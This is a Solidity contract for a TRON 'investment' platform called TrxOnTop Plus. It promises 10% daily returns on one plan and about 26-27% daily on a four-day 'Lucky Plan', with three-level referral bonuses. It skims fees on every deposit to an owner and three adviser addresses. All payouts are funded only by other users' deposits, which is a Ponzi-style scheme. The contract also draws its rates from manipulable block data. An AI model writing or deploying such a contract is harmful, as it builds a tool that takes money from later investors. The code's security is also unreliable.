//SourceUnit: TrxOnTop_Plus.sol

pragma solidity 0.5.14;

/* ---> (www.trxontop.com/plus)  | (c) 2020 Developed by TRX-ON-TOP TEAM TrxOnTop_Plus.sol | La Habana - Cuba <------ */

contract TrxOnTop_Plus {
   
    struct InfinitePlan {
        uint256 activeDeposit;
        uint256 recordDeposit;
        uint256 dividends; 
        uint256 depositsCount;
        uint256 withdrawn;
    }  
    
    struct LuckyPlan {
        uint256 activeDeposit;
        uint256 recordDeposit;
        uint256 insuredDeposit;
        uint256 tarif;
        uint256 dividends;
        uint256 depositsCount;
        uint256 depositStartTime; 
        uint256 depositFinishTime;
        uint256 withdrawn;
    }      
  
    struct Player {
        // Infinite Plan
        InfinitePlan[1] infinitePlan;
        
        // Lucky Plan
        LuckyPlan[1] luckyPlan;
        
        // General
        address upline;  
        uint256 match_bonus;
        uint256 last_payout;
        uint256 last_withdraw;
        uint256 total_withdrawn;
        uint256 total_withdrawnReferral;
        uint256 total_match_bonus;
        uint256 total_invested;
        uint256 firstDep_Time;
        mapping(uint8 => uint256) structure;
    }
    
    // Infinite Plan
    uint256 private infinitePlanDeposit_StartTime;
    
    // Lucky Plan
    uint256 private luckyPlanDeposit_StartTime;
    uint40  private lucky_count_int;
    uint256 private last_lucky_int;
    
    // General
    address payable private owner;
    address payable private adv_1;
    address payable private adv_2;
    address payable private adv_3;
    uint256 private contract_CreateTime;
    uint256 private contract_StartTime;
    uint256 private invested;
	uint256 private investors;
    uint256 private totalWithdrawn;
    uint256 private totalWithdrawnReferral;
    uint256 private match_bonus;
    uint256 private infiniteDepositCount;
    uint256 private luckyDepositCount;
    uint256 private insuredBalance;

    uint256 private constant LUCKYPLAN_LIFETIME               = 4 * 24 * 60 * 60;
    uint256 private constant CONTRACT_TIMETOSTART             = 15 * 60 * 60;
    uint256 private constant LUCKYPLAN_DEPOSIT_TIMETOSTART    = 33 * 60 * 60;
    uint256 private constant INFINITEPLAN_DEPOSIT_TIMETOSTART =  0 * 60 * 60;
    uint256 private constant ADV_FEE               = 10;
    uint256 private constant DEV_FEE               = 70;
    uint256 private constant MAX_LUCKY_IN_3HOUR    = 25;    
    uint256 private constant INFINITE_BASIC_TARIF  = 10E6;
    uint256 private constant MIN_INFINITE_INVEST   = 200E6;
    uint256 private constant MIN_INFINITE_WITHDRAW = 100E6;
    uint256 private constant AUTO_REINVEST_PERCENT = 50;
    uint256 private constant SECURE_PERCENT        = 4;
    uint256 private constant WAIT_FOR_NEXT_LUCKY   = 3 * 60 * 60;
    uint256 private constant WAIT_FOR_WITHDRAW     = 36 * 60 * 60;
    uint8[] private REF_BONUSES                    = [3, 2, 1];
    
    mapping(address => Player) private players;

    event Upline(address indexed addr, address indexed upline);
    event NewInfiniteDeposit(address indexed addr, uint256 amount);
    event NewLuckyDeposit(address indexed addr, uint256 amount);
    event NewReactiveLuckyPlan(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event WithdrawInfinite(address indexed addr, uint256 amount);
    event WithdrawLucky(address indexed addr, uint256 amount);
    event WithdrawReferral(address indexed addr, uint256 amount);
    event NewSecureLuckyPlan(address indexed addr, uint256 amount);

    constructor(address payable adv1, address payable adv2, address payable adv3) public {
        owner = msg.sender;
        adv_1 = adv1;
        adv_2 = adv2;
        adv_3 = adv3;
        contract_CreateTime = now;
        contract_StartTime = contract_CreateTime + CONTRACT_TIMETOSTART;
        
        // Infinite Plan
        infinitePlanDeposit_StartTime = contract_CreateTime + INFINITEPLAN_DEPOSIT_TIMETOSTART;
        
        // Lucky Plan
        luckyPlanDeposit_StartTime = contract_CreateTime + LUCKYPLAN_DEPOSIT_TIMETOSTART;
        last_lucky_int = luckyPlanDeposit_StartTime;
    }
   
    function refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        for(uint8 i = 0; i < REF_BONUSES.length; i++) {
            if(up == address(0)) break;
            uint256 bonus = _amount * REF_BONUSES[i] / 100;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;
            match_bonus += bonus;
            emit MatchPayout(up, _addr, bonus);
            up = players[up].upline;
        }
    }

    function setUpline(address _addr, address _upline) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
             if(players[_upline].infinitePlan[0].activeDeposit == 0) {
                 _upline = owner;
             }
            players[_addr].upline = _upline;
            emit Upline(_addr, _upline);
            for(uint8 i = 0; i < REF_BONUSES.length; i++) {
                players[_upline].structure[i]++;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
        }
    }

    function getLuckyTarif() view private returns (uint256) { 
        uint256 value = uint8(uint256(keccak256(abi.encode(block.timestamp, block.difficulty)))%11) + 260; 
        return value;
    }  
    
    function infinitePlanDeposit(address _upline) external payable {
        Player storage player = players[msg.sender];
        
        require(now >= infinitePlanDeposit_StartTime, "Infinite Plan is not available yet");
        require(msg.value >= MIN_INFINITE_INVEST, "Minimum to invest is 200 TRX");
    
        setUpline(msg.sender, _upline);

        if (player.infinitePlan[0].depositsCount == 0) {
            player.firstDep_Time = now;
            player.last_payout = maxVal(now, contract_StartTime);
            player.last_withdraw = maxVal(now, contract_StartTime);
            investors++;
        } else {
            update_InfinitePlanInterestProfit(msg.sender);
        }

        player.infinitePlan[0].depositsCount++;
        infiniteDepositCount ++;
        invested += msg.value;
        player.infinitePlan[0].activeDeposit += msg.value;
        player.infinitePlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;

        payContractFee(msg.value);
        refPayout(msg.sender, msg.value);
        emit NewInfiniteDeposit(msg.sender, msg.value);
    }
    
    function luckyPlanDeposit() external payable {
        if (now > last_lucky_int + WAIT_FOR_NEXT_LUCKY) {
            last_lucky_int = now;
            lucky_count_int = 0;
        }   
        Player storage player = players[msg.sender];
        require(now >= luckyPlanDeposit_StartTime, "Lucky Plan is not available yet");
        require(player.luckyPlan[0].activeDeposit == 0, "Only 1 Lucky Plan is allowed at the same time");
        require(lucky_count_int < MAX_LUCKY_IN_3HOUR, "Quota exceeded!!");
        require( (msg.value == 1000E6 || msg.value == 3000E6 || msg.value == 7000E6 || msg.value == 10000E6) && (player.infinitePlan[0].activeDeposit >= 2 * msg.value), "Wrong amount" );
        
        lucky_count_int++;
        luckyDepositCount++;
        player.luckyPlan[0].depositsCount++;
        invested += msg.value;
        player.luckyPlan[0].activeDeposit = msg.value;
        player.luckyPlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;
        player.luckyPlan[0].tarif = getLuckyTarif();
        player.luckyPlan[0].depositStartTime = now;
        player.luckyPlan[0].depositFinishTime = player.luckyPlan[0].depositStartTime + LUCKYPLAN_LIFETIME;

        payContractFee(msg.value);
        emit NewLuckyDeposit(msg.sender, msg.value);
    }  
    
    function secureActiveLuckyPlan() external payable { 
        Player storage player = players[msg.sender];
        require(player.luckyPlan[0].activeDeposit > 0, "Active Lucky Plan not found");
        require(player.luckyPlan[0].insuredDeposit == 0, "Your Lucky Plan is already insured");
        require(minZero(player.luckyPlan[0].depositFinishTime, now) > 0, "Your active Lucky Plan is complete"); 
        require(msg.value == player.luckyPlan[0].activeDeposit * SECURE_PERCENT / 100, "Wrong msg.value");
        uint256 sec_amount = player.luckyPlan[0].activeDeposit * LUCKYPLAN_LIFETIME * player.luckyPlan[0].tarif / 86400 / 1000;
        require(getAvailableContractBalance() > sec_amount, "Insufficient Contract Balance");
        player.luckyPlan[0].insuredDeposit = sec_amount;
        insuredBalance += sec_amount;
        emit NewSecureLuckyPlan(msg.sender, sec_amount);
    }       
    
    function update_InfinitePlanInterestProfit(address _addr) private {
        Player storage player = players[_addr];
        uint256 amount = getInfinitePlan_InterestProfit(_addr);
        if(amount > 0) {
            player.infinitePlan[0].dividends += amount;
            player.last_payout = now;
        }
    }   
    
    function infinitePlanWithdraw() external {
        Player storage player = players[msg.sender];
        require(player.infinitePlan[0].depositsCount > 0, "Active deposit is require");
        require(now >= player.last_withdraw + WAIT_FOR_WITHDRAW, "Only 1 Withdraw chance every 32 hours");
        uint contractBalance = getAvailableContractBalance();
        update_InfinitePlanInterestProfit(msg.sender);
        player.last_withdraw = now;
       
        uint256 t_amount = player.infinitePlan[0].dividends;
        require(t_amount >= MIN_INFINITE_WITHDRAW, "Minimum es 100 TRX");
        
        uint256 w_amount = t_amount * (100 - AUTO_REINVEST_PERCENT) / 100;
        uint256 r_amount = t_amount * AUTO_REINVEST_PERCENT / 100;  
        
        require(contractBalance >= w_amount, "Insufficient Contract Balance"); 
        player.infinitePlan[0].dividends = 0;
        player.total_withdrawn += w_amount;
        player.infinitePlan[0].withdrawn += w_amount;
        totalWithdrawn += w_amount;
        player.infinitePlan[0].activeDeposit += r_amount;
        msg.sender.transfer(w_amount);
        emit WithdrawInfinite(msg.sender, w_amount); 
    }
    
    function luckyPlanWithdraw() external {
        Player storage player = players[msg.sender];
        require(player.luckyPlan[0].depositFinishTime < now, "Plan not finished yet");
        
        uint amount = getLuckyPlan_InterestProfit(msg.sender); 
        
        if (player.luckyPlan[0].insuredDeposit == 0) {
           uint contractBalance = getAvailableContractBalance();
           require(contractBalance >= amount, "Contract balance < Interest Profit"); 
        } else {
           uint256 ib = insuredBalance; 
           insuredBalance = minZero(ib, player.luckyPlan[0].insuredDeposit);
           player.luckyPlan[0].insuredDeposit = 0;
        }
        
        player.luckyPlan[0].activeDeposit = 0;
        player.luckyPlan[0].tarif = 0;
        player.total_withdrawn += amount;
        player.luckyPlan[0].withdrawn += amount;
        totalWithdrawn += amount;           
        
        msg.sender.transfer(amount);
        emit WithdrawLucky(msg.sender, amount);
    }     
    
    function reactiveLuckyPlan() external {
        Player storage player = players[msg.sender];
        require(player.luckyPlan[0].depositFinishTime < now, "Plan not finished yet");
  
        uint w_amount = minZero(getLuckyPlan_InterestProfit(msg.sender), player.luckyPlan[0].activeDeposit); 
        
        uint256 contractBalance = getAvailableContractBalance();
        require(contractBalance >= w_amount, "Contract balance < Interest Profit");
        player.total_withdrawn += w_amount;
        player.luckyPlan[0].withdrawn += w_amount;
        totalWithdrawn += w_amount;  
        msg.sender.transfer(w_amount);
        emit WithdrawLucky(msg.sender, w_amount); 
        
        uint256 ib = insuredBalance; 
        insuredBalance = minZero(ib, player.luckyPlan[0].insuredDeposit);
        player.luckyPlan[0].insuredDeposit = 0;
        player.luckyPlan[0].depositsCount++;
        luckyDepositCount++;
        player.luckyPlan[0].recordDeposit += player.luckyPlan[0].activeDeposit;
        player.total_invested += player.luckyPlan[0].activeDeposit;
        player.luckyPlan[0].tarif = getLuckyTarif();
        player.luckyPlan[0].depositStartTime = now;
        player.luckyPlan[0].depositFinishTime = player.luckyPlan[0].depositStartTime + LUCKYPLAN_LIFETIME;
        if (contractBalance >= player.luckyPlan[0].activeDeposit * 10 / 100 ) {
            payContractFee(player.luckyPlan[0].activeDeposit);  
        }
        emit NewReactiveLuckyPlan(msg.sender, player.luckyPlan[0].activeDeposit);
    }     
    
    function referralWithdraw() external {
        Player storage player = players[msg.sender];
        uint contractBalance = getAvailableContractBalance();
        require(player.infinitePlan[0].depositsCount > 0, "Active deposit is require");
        require(contractBalance >= player.match_bonus, "Contract balance < Referral bonus");

        uint256 amount = player.match_bonus;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        player.total_withdrawnReferral += amount;
        totalWithdrawnReferral += amount;
        totalWithdrawn += amount;
        
        msg.sender.transfer(amount);
        emit WithdrawReferral(msg.sender, amount);
    }  

    function getInfinitePlan_InterestProfit(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];
        uint256 fr = player.last_payout;
        if (contract_StartTime > now) {
          fr = now; 
        }
        uint256 Tarif = INFINITE_BASIC_TARIF;
        uint256 to = now;
        if(fr < to) {
            value = player.infinitePlan[0].activeDeposit * (to - fr) * Tarif / 86400 / 100E6;
        } else {
            value = 0;
        }
        return value;
    }
  
    function getLuckyPlan_InterestProfit(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];
        if (player.luckyPlan[0].activeDeposit > 0) {
          if (now < player.luckyPlan[0].depositFinishTime) {
               uint256 fr = player.luckyPlan[0].depositStartTime;
               uint256 to = now;
               value = player.luckyPlan[0].activeDeposit * (to - fr) * player.luckyPlan[0].tarif / 86400 / 1000;
          } else {
            value = player.luckyPlan[0].activeDeposit * LUCKYPLAN_LIFETIME * player.luckyPlan[0].tarif / 86400 / 1000;
          } 
        } else {
            value = 0;
        }
        return value;
    } 
    
    function payContractFee(uint256 val) private {
        uint256 adv_amount = (val * ADV_FEE) / 1000;
        uint256 dev_amount = (val * DEV_FEE) / 1000;
        owner.transfer(dev_amount);
        adv_1.transfer(adv_amount);
        adv_2.transfer(adv_amount);
        adv_3.transfer(adv_amount);
    }
    
    function minZero(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return a - b; 
        } else {
           return 0;    
        }    
    }   
    
    function maxVal(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return a; 
        } else {
           return b;    
        }    
    }
    
    function minVal(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return b; 
        } else {
           return a;    
        }    
    }
    
	function getContractBalance() internal view returns (uint256) {
		return address(this).balance;
	}  
	
	function getAvailableContractBalance() internal view returns (uint256) {
		return minZero(getContractBalance(), insuredBalance);
	}	
    
    function userGeneralInfo(address _addr) view external returns(uint256 _totalInvested, uint256 _totalWithdrawn, uint256 _total_WithdrawnReferral, uint256 _totalMatchBonus, uint256 _matchBonus, uint256 _runningTime, uint256[3] memory _structure) {
        Player storage player = players[_addr];
        uint256 runningTime = 0;
        if (player.total_invested > 0) {
         runningTime = now - player.firstDep_Time;
        }
        for(uint8 i = 0; i < REF_BONUSES.length; i++) {
            _structure[i] = player.structure[i];
        }
        return (
            player.total_invested,
            player.total_withdrawn,
            player.total_withdrawnReferral,
            player.total_match_bonus,
            player.match_bonus,
            runningTime,
            _structure
        );    
    }  
    
    function userInfinitePlanInfo(address _addr) view external returns(uint256 _activeDeposit, uint256 _recordDeposit, uint256 _dividends, uint256 _depositsCount, uint256 _withdrawn, uint256 _nextWithdraw) {
        Player storage player = players[_addr];
        uint256 nw;
        if (now < contract_StartTime || player.infinitePlan[0].depositsCount == 0) {
            nw = 0;
        } else {
            nw = minZero(player.last_withdraw + WAIT_FOR_WITHDRAW, now);
        }
        return (
            player.infinitePlan[0].activeDeposit,
            player.infinitePlan[0].recordDeposit,
            player.infinitePlan[0].dividends + getInfinitePlan_InterestProfit(_addr),
            player.infinitePlan[0].depositsCount,
            player.infinitePlan[0].withdrawn,
            nw
        );  
    }    
    
    function userLuckyPlanInfo(address _addr) view external returns(uint256 _activeDeposit, uint256 _recordDeposit, uint256 _tarif, uint256 _dividends, uint256 _depositsCount, uint256 _withdrawn, uint256 _insuredDeposit, uint256 _nextWithdraw) {
       Player storage player = players[_addr];
        return (
            player.luckyPlan[0].activeDeposit,
            player.luckyPlan[0].recordDeposit,
            player.luckyPlan[0].tarif,
            getLuckyPlan_InterestProfit(_addr),
            player.luckyPlan[0].depositsCount,
            player.luckyPlan[0].withdrawn,
            player.luckyPlan[0].insuredDeposit,
            minZero(player.luckyPlan[0].depositFinishTime, now)
        );  
    }  
    
    function contractInfo() view external returns(uint256 _invested, uint256 _investors, uint256 _insuredBalance, uint256 _availableBalance,  uint256 _totalBalance, uint256 _matchBonus, uint256 _totalWithdrawn, uint256 _infiniteDepositCount, uint256 _luckyDepositCount, uint256 _luckyCountInt, uint256 _nextLucky, uint256 _contractIniTime, uint256 _infiniteDepIniTime, uint256 _luckyDepIniTime) {
        return (
            invested,
            investors,
            insuredBalance,
            getAvailableContractBalance(),
            getContractBalance(),
            match_bonus,
            totalWithdrawn,
            infiniteDepositCount,
            luckyDepositCount,
            lucky_count_int,
            minZero(last_lucky_int + WAIT_FOR_NEXT_LUCKY, now),
            minZero(contract_StartTime, now),
            minZero(infinitePlanDeposit_StartTime, now),
            minZero(luckyPlanDeposit_StartTime, now)
        );
    }
}